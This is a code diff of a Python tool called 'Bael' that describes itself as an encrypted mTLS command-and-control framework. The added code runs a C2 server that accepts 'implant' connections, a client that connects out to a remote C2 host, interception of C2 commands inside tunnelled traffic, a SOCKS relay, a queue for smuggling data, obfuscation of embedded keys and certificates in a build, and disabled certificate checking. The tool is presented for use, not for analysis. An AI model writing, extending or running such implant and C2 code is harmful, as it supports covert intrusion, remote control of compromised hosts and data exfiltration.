-            config['remoteHost'] = input("[?] Remote Peer Address: ").strip()
-            config['remotePort'] = int(input("[?] Remote Peer Port [443]: ").strip() or 443)
-        config['tunName'] = input("[?] TUN Interface Name [bael0]: ").strip() or "bael0"
-        config['tunIp'] = input("[?] Virtual TUN IP [10.8.0.1]: ").strip() or "10.8.0.1"
-        config['tunMask'] = input("[?] Virtual TUN Mask [255.255.255.0]: ").strip() or "255.255.255.0"
-        config['mTLS'] = input("[?] Enable mTLS? (y/n) [y]: ").strip().lower() != 'n'
-        if config['mTLS']:
-            config['certFile'] = input("[?] Cert path: ").strip()
-            config['keyFile'] = input("[?] Key path: ").strip()
-            config['caFile'] = input("[?] CA path: ").strip()
-        filename = input("[?] Save as [tun_settings.json]: ").strip() or "tun_settings.json"
-        with open(filename, 'w') as f: json.dump(config, f, indent=4)
-        logger.info(f"Configuration saved to {filename}")
-    except KeyboardInterrupt: print("\nWizard aborted."); sys.exit(0)
+            ctx.verify_mode = ssl.CERT_NONE
+        return ctx
+
+    def cleanup(self):
+        if self.temp_dir and self.temp_dir.exists():
+            shutil.rmtree(self.temp_dir, ignore_errors=True)
+        if self.tun_fd != -1:
+            try: os.close(self.tun_fd)
+            except: pass
+
+    def setup_tun(self):
+        self.tun_fd = os.open("/dev/net/tun", os.O_RDWR)
+        ifr = struct.pack('16sH', b'bael0', 0x0001 | 0x1000)
+        fcntl.ioctl(self.tun_fd, 0x400454ca, ifr)
+        subprocess.run(["ip", "addr", "add", "10.8.0.2/24", "dev", "bael0"], check=True)
+        subprocess.run(["ip", "link", "set", "bael0", "up"], check=True)
+
+    async def _bridge_tun(self, r, w, to_ssl):
+        try:
+            while True:
+                if to_ssl:
+                    data = await asyncio.get_event_loop().run_in_executor(None, os.read, self.tun_fd, 2048)
+                    if not data: break
+                    w.write(data); await w.drain()
+                else:
+                    data = await r.read(32768)
+                    if not data: break
+                    # Intercept C2 commands before bridging to TUN
+                    if await self.c2.process_command(data):
+                        continue
+                    os.write(self.tun_fd, data)
+        except: pass
+
+    # ====================== SERVER ======================
+    async def start_server(self):
+        host = self.config.get("listen_host", "0.0.0.0")
+        port = self.config.get("listen_port", 443)
+
+        server = await asyncio.start_server(self._handle_client, host, port, ssl=self.ssl_ctx)
+        logger.info(f"Bael C2 Server listening on {host}:{port} | Encrypted C2 Active")
+
+        # Start console
+        console_task = asyncio.create_task(self.console.run())
+
+        async with server:
+            await server.serve_forever()
+
+    async def _handle_client(self, reader, writer):
+        addr = writer.get_extra_info('peername')
+        logger.info(f"Implant connected from {addr}")
+        try:
+            await asyncio.gather(
+                self._server_to_client(writer),
+                self._client_to_server(reader)
+            )
+        finally:
+            writer.close()
+
+    async def _server_to_client(self, writer):
+        while True:
+            if self.smuggle_queue:
+                try:
+                    data = self.smuggle_queue.popleft()
+                    writer.write(data)
+                    await writer.drain()
+                except: break
+            await asyncio.sleep(0.05)
+
+    async def _client_to_server(self, reader):
+        while True:
+            data = await reader.read(32768)
+            if not data: break
+            await self.c2.process_command(data)
+
+    # ====================== CLIENT ======================
+    async def start_client(self):
+        host = self.config["remoteHost"]
+        port = self.config["remotePort"]
+        reader, writer = await asyncio.open_connection(host, port, ssl=self.ssl_ctx)
+        logger.info(f"Connected to C2 server {host}:{port}")
+
+        if self.config.get("use_socks"):
+            relay = SocksRelay()
+            srv = await asyncio.start_server(lambda r, w: relay.handle(r, w, reader, writer, self), '127.0.0.1', 1080)
+            logger.info("Non-root SOCKS5 transport initialized on 127.0.0.1:1080")
+            async with srv: await srv.serve_forever()
+        else:
+            if os.getuid() != 0: raise PermissionError("TUN requires root. Use --socks.")
+            self.setup_tun()
+            await asyncio.gather(self._bridge_tun(reader, writer, True), self._bridge_tun(reader, writer, False))
+
+    async def start(self):
+        try:
+            if self.is_server:
+                await self.start_server()
+            else:
+                await self.start_client()
+        except Exception as e:
+            logger.error(f"Engine failure: {e}")
+        finally:
+            self.cleanup()
+
+
+# ====================== BUILD / KEYGEN ======================
+def embed_assets(key: str = "bael_default_secret"):
+    global EMBEDDED_CERTS
+    keys_dir = Path(".baelKeys")
+    if not keys_dir.exists():
+        logger.error(".baelKeys directory not found!")
+        return
+    for f in list(keys_dir.glob("*.crt")) + list(keys_dir.glob("*.key")):
+        EMBEDDED_CERTS[f.name] = BaelShield.obfuscate(f.read_bytes(), key)
+    logger.info(f"Embedded {len(EMBEDDED_CERTS)} assets")
 
 def genkeys(args):
     keysRoot = Path(".baelKeys"); keysRoot.mkdir(exist_ok=True)
@@ -455,66 +494,56 @@ def genkeys(args):
         logger.info(f"Keys generated in {keysRoot}")
     except Exception as e: logger.error(f"Keygen failed: {e}")
 
-if __name__ == "__main__":
-    args = build_parser().parse_args()
-    if args.verbose: handler.setLevel(logging.DEBUG); logger.info("Verbose mode enabled")
-    if args.gen_config: genConfigInteractive(); sys.exit(0)
-    if args.mode == "keygen": genkeys(args); sys.exit(0)
-    if args.mode == "encode-dns":
-        if not args.encode_str or not args.target_hostname:
-            logger.error("--encode-str and --target-hostname required"); sys.exit(1)
-        k = hashlib.md5(args.target_hostname.encode()).digest(); p = args.encode_str.encode()
-        res = base64.b64encode(bytes([p[i] ^ k[i % len(k)] for i in range(len(p))])).decode()
-        print(f"\n[+] Obfuscated DNS TXT Record:\n{res}\n"); sys.exit(0)
-    if args.mode == "down":
-        conf = {"tunName": getattr(args, 'tun_name', "bael0")}
-        if args.config and os.path.exists(args.config):
-            with open(args.config) as f: conf.update(json.load(f))
-        Bael(conf).destroyTun(); sys.exit(0)
+def main():
+    p = argparse.ArgumentParser(description=f"Bael v{__version__} — Advanced Encrypted mTLS C2", add_help=False)
+    p.add_argument("--mode", choices=["tun", "server", "build", "keygen"], default="tun")
+    p.add_argument("--listen", default="0.0.0.0:443", help="Server listen address:port")
+    p.add_argument("--remote", help="Client remote C2 server:port")
+    p.add_argument("--socks", action="store_true")
+    p.add_argument("--key", default="bael_default_secret")
+    p.add_argument("--data-transmit")
+    p.add_argument("--debug", action="store_true")
+
+    args = p.parse_args()
+
+    if args.debug:
+        logger.setLevel(logging.DEBUG)
+
+    if args.mode == "keygen":
+        genkeys(args)
+        return
     if args.mode == "build":
-        Bael.buildExecutable("bMTLSTUN0_LEGACY" if args.legacy else "bMTLSTUN0", verbose=args.verbose, bundle_keys=args.bundle_keys); sys.exit(0)
-    
-    if args.legacy:
-        if not all([args.cert, args.key, args.ca]): logger.error("Legacy requires --cert --key --ca"); sys.exit(1)
-        legacy = BaelLegacy(args)
-        try: asyncio.run(legacy.run())
-        except KeyboardInterrupt: pass
-    else:
-        conf = {"logLevel": "INFO", "maxRetries": 5, "retryInterval": 2, "jitter": 0.2, "mTLS": True, "mode": "client", "tunName": getattr(args, 'tun_name', "bael0"), "verbose": args.verbose}
-        if args.config and os.path.exists(args.config):
-            with open(args.config) as f: conf.update(json.load(f))
-        if not args.config and args.mode in ["tun", "server"]:
-            conf.update({
-                "remoteHost": args.remote.split(":")[0] if args.remote else None,
-                "remotePort": int(args.remote.split(":")[1]) if args.remote and ":" in args.remote else 443,
-                "certFile": args.cert, "keyFile": args.key, "caFile": args.ca,
-                "mode": "server" if args.mode == "server" else "client"
-            })
-        tool = Bael(conf)
-        if args.dns_lookup:
-            txt = tool.resolveDnsTxt(args.dns_lookup)
-            if txt:
-                try: conf.update(json.loads(txt))
-                except: logger.info(f"DNS TXT: {txt}")
-        
-        effective_mode = args.mode or conf.get("mode")
-        if effective_mode == "tun": effective_mode = conf.get("mode", "client")
-        
-        try:
-            if effective_mode == "server":
-                async def tun_server():
-                    tool.validatePrivileges(); tool.setupTun()
-                    async def handle_tun(r, w):
-                        logger.info("Inbound L3 Tunnel verified.")
-                        await asyncio.gather(tool.bridge(r, w, True), tool.bridge(r, w, False))
-                    l_host = conf.get("listenHost", args.listen.split(":")[0])
-                    l_port = int(conf.get("listenPort", args.listen.split(":")[1] if ":" in args.listen else 443))
-                    server = await asyncio.start_server(handle_tun, l_host, l_port, ssl=tool.sslContext)
-                    async with server: await server.serve_forever()
-                asyncio.run(tun_server())
-            else:
-                asyncio.run(tool.start())
-        except KeyboardInterrupt:
-            logger.info("Shutdown requested. Cleaning up..."); tool.destroyTun()
-        except Exception as e:
-            logger.error(f"Unexpected error: {e}"); tool.destroyTun()
+        embed_assets(args.key)
+        Bael.build(verbose=args.debug)
+        return
+
+    listen_host, listen_port = "0.0.0.0", 443
+    if args.listen and ":" in args.listen:
+        listen_host, listen_port = args.listen.rsplit(":", 1)
+        listen_port = int(listen_port)
+
+    conf = {
+        "mode": "server" if args.mode == "server" else "client",
+        "use_socks": args.socks,
+        "key": args.key,
+        "remoteHost": (args.remote or "127.0.0.1").split(":")[0],
+        "remotePort": int((args.remote or ":443").split(":")[-1]),
+        "listen_host": listen_host,
+        "listen_port": listen_port,
+        "data_transmit": args.data_transmit,
+    }
+
+    engine = Bael(conf)
+
+    def shutdown(*_):
+        engine.cleanup()
+        sys.exit(0)
+
+    signal.signal(signal.SIGINT, shutdown)
+    signal.signal(signal.SIGTERM, shutdown)
+
+    asyncio.run(engine.start())
+
+
+if __name__ == "__main__":
+    main()
